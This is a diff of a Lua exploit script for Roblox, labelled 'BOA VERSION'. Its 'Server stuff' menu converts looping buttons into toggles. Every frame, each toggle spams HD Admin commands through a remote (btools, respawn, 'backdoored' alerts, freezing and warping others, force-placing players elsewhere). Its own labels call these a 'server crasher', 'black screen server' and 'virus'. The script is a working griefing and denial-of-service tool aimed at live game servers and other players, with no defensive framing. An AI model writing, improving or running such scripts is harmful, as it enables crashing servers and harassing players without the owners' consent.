@@ -1,3 +1,5 @@
+-- BOA VERSION --
+
 local colors = {
     SchemeColor = Color3.fromRGB(51, 88, 130),
     Background = Color3.fromRGB(27, 42, 53),
@@ -194,56 +196,133 @@ end)
 
 local Section = Tab:NewSection("Server stuff")
 
-Section:NewButton("Server crasher [PERM]", "Crash server", function()
-    print("enabled server crasher")
-		while true do
-			local args = {
-				[1] = ";btools others"
-			}
-			game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
-		end
+local isRunning = false
+local connection
+
+Section:NewToggle("Server crash", "server Crash", function(state)
+    if state then
+	print("enabled server crasher")
+    isRunning = true
+
+	connection = game:GetService("RunService").Stepped:Connect(function()
+	if isRunning then
+		local args = {
+			[1] = ";btools others"
+		}
+		game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
+	else
+		connection:Disconnect()
+	end
+end)
+else
+	print("Disabled server crasher")
+	isRunning = false
+	if connection then
+		connection:Disconnect()
+		connection = nil
+	end
+end
 end)
 
-Section:NewButton("Annoy server [PERM]", "Annoy server", function()
-    print("enabled annoying stuff")
-		while true do
-			local args = {
-				[1] = ";re others"
-			}
-			game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
-		end
+Section:NewToggle("Annoy server", "Annoying the server", function(state)
+    if state then
+	print("enabled annoying server")
+    isRunning = true
+
+	connection = game:GetService("RunService").Stepped:Connect(function()
+	if isRunning then
+		local args = {
+			[1] = ";re others"
+		}
+		game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
+	else
+		connection:Disconnect()
+	end
+end)
+else
+	print("Disabled server crasher")
+	isRunning = false
+	if connection then
+		connection:Disconnect()
+		connection = nil
+	end
+end
 end)
 
-Section:NewButton("Spam Alert server [PERM]", "Sends alerts every milisecond", function()
-    print("enabled virus")
-		while true do
-			local args = {
-				[1] = ";alert all backdoored 101"
-			}
-			game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
-		end
+Section:NewToggle("Loop alert", "Alerts every milisecond", function(state)
+    if state then
+	print("enabled loop alert")
+    isRunning = true
+
+	connection = game:GetService("RunService").Stepped:Connect(function()
+	if isRunning then
+		local args = {
+			[1] = ";alert all backdoored 101"
+		}
+		game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
+	else
+		connection:Disconnect()
+	end
+end)
+else
+	print("Disabled loop alert")
+	isRunning = false
+	if connection then
+		connection:Disconnect()
+		connection = nil
+	end
+end
 end)
 
-Section:NewButton("Spam forceplace server [PERM]", "Sends forceplace every milisecond", function()
-    print("enabled spam forceplace")
-		while true do
-			local args = {
-				[1] = ";forceplace others 5688329453"
-			}
-			game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
-		end
+Section:NewToggle("Black screen server", "black screen server", function(state)
+    if state then
+	print("enabled black screen server")
+    isRunning = true
+
+	connection = game:GetService("RunService").Stepped:Connect(function()
+	if isRunning then
+		local args = {
+			[1] = ";speed others 0 ;warp others"
+		}
+		game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
+	else
+		connection:Disconnect()
+	end
+end)
+else
+	print("Disabled black screen server")
+	isRunning = false
+	if connection then
+		connection:Disconnect()
+		connection = nil
+	end
+end
 end)
 
-Section:NewButton("Black screen server [PERM]", "Black screen server", function()
-    print("enabled spam forceplace")
-		while true do
-			local args = {
-				[1] = ";speed others inf ;warp others ;re others"
-			}
-			game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
-		end
-end)
+Section:NewToggle("Server forceplacer", "server forceplacer", function(state)
+    if state then
+	print("enabled server forceplacer")
+    isRunning = true
 
+	connection = game:GetService("RunService").Stepped:Connect(function()
+	if isRunning then
+		local args = {
+			[1] = ";forceplace others 5688329453"
+		}
+		game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
+	else
+		connection:Disconnect()
+	end
+end)
+else
+	print("Disabled server forceplacer")
+	isRunning = false
+	if connection then
+		connection:Disconnect()
+		connection = nil
+	end
+end
+end)
 
 local Tab = Window:NewTab("Admin")
 local Section = Tab:NewSection("Gears and stuff")
